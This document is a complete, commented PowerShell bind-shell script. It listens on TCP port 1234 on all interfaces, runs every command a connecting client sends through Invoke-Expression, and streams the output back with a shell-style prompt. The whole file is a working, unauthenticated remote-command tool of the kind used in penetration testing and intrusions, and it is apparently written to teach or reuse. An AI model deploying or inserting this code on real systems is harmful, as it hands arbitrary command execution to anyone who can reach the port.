$port = 1234
$server = [System.Net.Sockets.TcpListener]$port                                                                  #Create and bind a TCP socket

:main while ($true){
    Try{
        $server.start()                                                                                          #Start Listening on 0.0.0.0:$port
        Write-Host "[*] Listening for connection on 0.0.0.0:${port}..."
    } Catch {
        Write-Error $_.Exception.Message
        Write-Warning "Problem binding to 0.0.0.0:$port"
        break
    }           
    $client = $server.AcceptTcpClient()                                                                          #Indefinitely wait for and accept connection
    Write-Host "[*] Connection established from client"

    $stream = $client.GetStream()                                                                                #Get raw data in bytes from tcp stream

    #Byte Array with 65536 elements filled with 0 values
    [byte[]]$bytes = 0..65535|%{0}                                                                               #Create a byte array to use as buffer to store data 

    $prompt = ([text.encoding]::ASCII).GetBytes("PS [" + ${env:username} + " " + (Get-Location).Path + "]`n> ")  #Create command prompt in byte format

    $stream.Write($prompt,0,$prompt.Length)                                                                      #Send the prompt to the client

    while (($numberOfBytes = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){                                              #while bytes read from stream is not 0

        $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding                                            #Create an ASCII Encoding Object

        $cmd = $EncodedText.GetString($bytes,0, $numberOfBytes)                                                           #Covert data from bytes to string with ASCII encoding

        if ( ($cmd) -and ($cmd -notmatch "exit") ){                                                              #If $cmd is not null and it doesn't equal "exit"
            $output_string = (Invoke-Expression -Command $cmd 2>&1 | Out-String )                                #Execute the command received from the client on the server

            $output_bytes = ([text.encoding]::ASCII).GetBytes($output_string)                                    #Convert command output string to bytes

            $stream.Write($output_bytes,0,$output_bytes.Length)                                                  #Send command output bytes to client
            $stream.Flush()                                                                                      #Flush the stream
            $stream.Write($prompt,0,$prompt.Length)                                                              #Send command prompt as bytes to client
            $stream.Flush()                                                                                      #Flush the stream
        } else {
            Write-Host "[*] Disconnecting from client..."
            $stream.Dispose()                                                                                    #Destroy stream
            $client.Dispose()                                                                                    #Disconnect from client
            $server.stop()                                                                                       #Stop listener
            break main
        }
    }  
}

